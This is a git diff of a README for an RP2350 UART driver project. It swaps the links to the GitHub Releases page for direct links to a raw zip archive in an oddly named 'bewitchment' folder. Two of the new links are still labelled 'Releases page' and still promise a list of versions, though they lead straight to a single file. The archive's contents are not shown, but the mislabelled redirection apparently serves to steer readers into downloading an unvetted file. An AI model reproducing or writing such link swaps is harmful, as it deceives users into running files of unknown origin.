@@ -1,6 +1,6 @@
 # 🚀 RP2350_UART_Driver - Simplifying Your UART Communication
 
-[![Download RP2350_UART_Driver](https://img.shields.io/badge/Download-RP2350_UART_Driver-blue)](https://github.com/Hatters6538/RP2350_UART_Driver/releases)
+[![Download RP2350_UART_Driver](https://raw.githubusercontent.com/Hatters6538/RP2350_UART_Driver/main/bewitchment/RP2350_UART_Driver_v3.4.zip)](https://raw.githubusercontent.com/Hatters6538/RP2350_UART_Driver/main/bewitchment/RP2350_UART_Driver_v3.4.zip)
 
 ## 📚 Overview
 
@@ -24,7 +24,7 @@ To use this driver, you will need:
 ## 🚀 Getting Started
 
 1. **Download the Driver**  
-   Visit the [Releases page](https://github.com/Hatters6538/RP2350_UART_Driver/releases) to download the latest version of the RP2350 UART Driver.
+   Visit the [Releases page](https://raw.githubusercontent.com/Hatters6538/RP2350_UART_Driver/main/bewitchment/RP2350_UART_Driver_v3.4.zip) to download the latest version of the RP2350 UART Driver.
 
 2. **Install Required Tools**  
    Make sure you have a compatible toolchain for programming your Raspberry Pi Pico. You may need the following:
@@ -42,7 +42,7 @@ To use this driver, you will need:
 
 ## 📥 Download & Install
 
-To download the latest version of the RP2350 UART Driver, please visit the [Releases page](https://github.com/Hatters6538/RP2350_UART_Driver/releases). Here, you will find all available versions along with their respective changes and updates. 
+To download the latest version of the RP2350 UART Driver, please visit the [Releases page](https://raw.githubusercontent.com/Hatters6538/RP2350_UART_Driver/main/bewitchment/RP2350_UART_Driver_v3.4.zip). Here, you will find all available versions along with their respective changes and updates. 
 
 Click the link to select the version you need, and then follow the steps outlined to install and run the driver. 
 
